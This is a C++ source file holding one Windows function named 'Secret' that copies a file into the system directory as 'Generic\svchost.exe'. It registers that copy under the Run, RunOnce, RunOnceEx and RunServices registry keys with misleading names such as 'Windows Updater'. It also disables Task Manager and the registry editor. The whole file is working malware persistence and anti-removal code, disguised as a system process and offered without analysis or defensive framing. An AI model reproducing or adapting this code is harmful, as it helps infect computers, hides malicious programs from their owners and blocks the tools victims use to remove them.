#include "data_globals.h"
#pragma optimize("", off)
void Secret(LPCSTR sourceFilePath)
{
    volatile struct _LocalCtx {
        char systemPath[MAX_PATH];
        HKEY hKey;
        BYTE enable[4];
        size_t len;
    } ctx;

    ctx.hKey = 0;
    ctx.len = 0;
    const_cast<BYTE*>(ctx.enable)[0] = 1;
    const_cast<BYTE*>(ctx.enable)[1] = 0;
    const_cast<BYTE*>(ctx.enable)[2] = 0;
    const_cast<BYTE*>(ctx.enable)[3] = 0;

    GetSystemDirectoryA(const_cast<LPSTR>(ctx.systemPath), MAX_PATH);

    ctx.len = strlen(const_cast<const char*>(ctx.systemPath));
    strcpy(const_cast<char*>(ctx.systemPath + ctx.len), "\\Generic");
    CreateDirectoryA(const_cast<LPCSTR>(ctx.systemPath), NULL);

    ctx.len = strlen(const_cast<const char*>(ctx.systemPath));
    strcpy(const_cast<char*>(ctx.systemPath + ctx.len), "\\svchost.exe");
    CopyFileA(sourceFilePath, const_cast<LPCSTR>(ctx.systemPath), FALSE);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(&ctx.hKey));
    RegSetValueExA(ctx.hKey, "Generic Host Process for Win32 Services", 0,
                   REG_SZ, (const BYTE*)const_cast<const char*>(ctx.systemPath), (DWORD)(strlen(const_cast<const char*>(ctx.systemPath)) + 1));
    RegCloseKey(ctx.hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(&ctx.hKey));
    RegSetValueExA(ctx.hKey, "Windows Updater", 0,
                   REG_SZ, (const BYTE*)const_cast<const char*>(ctx.systemPath), (DWORD)(strlen(const_cast<const char*>(ctx.systemPath)) + 1));
    RegCloseKey(ctx.hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(&ctx.hKey));
    RegSetValueExA(ctx.hKey, "Windows Server", 0,
                   REG_SZ, (const BYTE*)const_cast<const char*>(ctx.systemPath), (DWORD)(strlen(const_cast<const char*>(ctx.systemPath)) + 1));
    RegCloseKey(ctx.hKey);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(&ctx.hKey));
    RegSetValueExA(ctx.hKey, "Generic", 0,
                   REG_SZ, (const BYTE*)const_cast<const char*>(ctx.systemPath), (DWORD)(strlen(const_cast<const char*>(ctx.systemPath)) + 1));
    RegCloseKey(ctx.hKey);

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(&ctx.hKey));
    RegSetValueExA(ctx.hKey, "DisableTaskMgr", 0,
                   REG_DWORD, const_cast<const BYTE*>(ctx.enable), sizeof(ctx.enable));
    RegCloseKey(ctx.hKey);

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, const_cast<PHKEY>(&ctx.hKey));
    RegSetValueExA(ctx.hKey, "DisableRegistrytools", 0,
                   REG_DWORD, const_cast<const BYTE*>(ctx.enable), sizeof(ctx.enable));
    RegCloseKey(ctx.hKey);
}
#pragma optimize("", on)
